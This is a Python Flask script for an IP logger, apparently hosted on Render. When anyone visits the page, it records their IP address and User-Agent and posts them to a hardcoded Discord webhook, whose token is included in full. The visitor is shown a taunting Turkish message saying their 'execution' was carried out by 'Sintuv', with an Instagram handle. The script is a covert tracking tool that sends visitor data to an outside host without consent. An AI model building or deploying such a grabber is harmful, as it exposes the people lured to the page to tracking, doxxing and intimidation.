from flask import Flask, request
import requests
import os

app = Flask(__name__)

# Discord Webhook URL'ni buraya yapıştır
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1565829327067684985/o10w6-xbGWqXFeAe20JDhxyoUBr74JcdsswTmLNxKKj22G5vJIF2Y9LRs-LDiujHz2PQ"

@app.route('/')
def ip_logger():
    if request.headers.get('X-Forwarded-For'):
        ip_address = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip_address = request.remote_addr

    user_agent = request.headers.get('User-Agent')

    # Discord'a gönderilecek mesaj
    discord_data = {
        "content": f"🚨 **Yeni Ziyaretçi Yakalandı (Render)!**\n> 🌐 **IP:** `{ip_address}`\n> 💻 **Cihaz:** `{user_agent}`"
    }
    
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=discord_data)
    except Exception as e:
        print(e)

    # Yeni ve sade/karizmatik tasarım
    html_content = """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sintuv</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                background-color: #090d16;
                color: #f1f5f9;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .container {
                text-align: center;
                background: #111827;
                padding: 50px 40px;
                border-radius: 20px;
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
                max-width: 600px;
                width: 90%;
                border: 1px solid rgba(239, 68, 68, 0.2);
            }
            h1 {
                font-size: 2.2rem;
                margin-bottom: 25px;
                color: #ef4444;
                letter-spacing: 1px;
                text-shadow: 0 0 15px rgba(239, 68, 68, 0.3);
            }
            .textbox {
                background: #1f2937;
                border: 1px solid #374151;
                color: #e2e8f0;
                padding: 25px;
                border-radius: 12px;
                font-size: 1.3rem;
                margin-bottom: 30px;
                box-shadow: inset 0 2px 4px rgba(0,0,0,0.3);
            }
            .footer {
                font-size: 1.1rem;
                color: #94a3b8;
                letter-spacing: 1.5px;
                font-weight: 600;
            }
            .footer span {
                color: #38bdf8;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Sintuv tarafından infazınız verilmiştir</h1>
            <div class="textbox">
                Geçmiş olsun.
            </div>
            <div class="footer">
                İG : <span>Sintuv0</span>
            </div>
        </div>
    </body>
    </html>
    """
    
    return html_content

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
